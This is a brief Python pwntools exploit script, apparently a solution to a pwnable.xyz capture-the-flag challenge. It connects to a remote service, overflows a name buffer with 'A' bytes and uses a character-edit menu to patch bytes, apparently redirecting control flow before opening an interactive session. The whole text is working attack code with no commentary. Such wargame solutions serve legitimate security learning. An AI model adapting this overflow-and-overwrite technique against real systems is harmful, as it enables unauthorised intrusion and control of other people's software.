from pwn import *
p = remote('svc.pwnable.xyz', 30015)

def edit_char(old, c):
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b": ", old)
    p.sendlineafter(b": ", c)

p.sendafter(b"Name: ", b"A" * 0x7f)

for i in range(5):
    edit_char(b'F', b'B')

edit_char(b'\x6b', b'\xf3')
edit_char(b'\x0d', b'\x0c')

p.sendlineafter(b"> ", b"1")
p.interactive()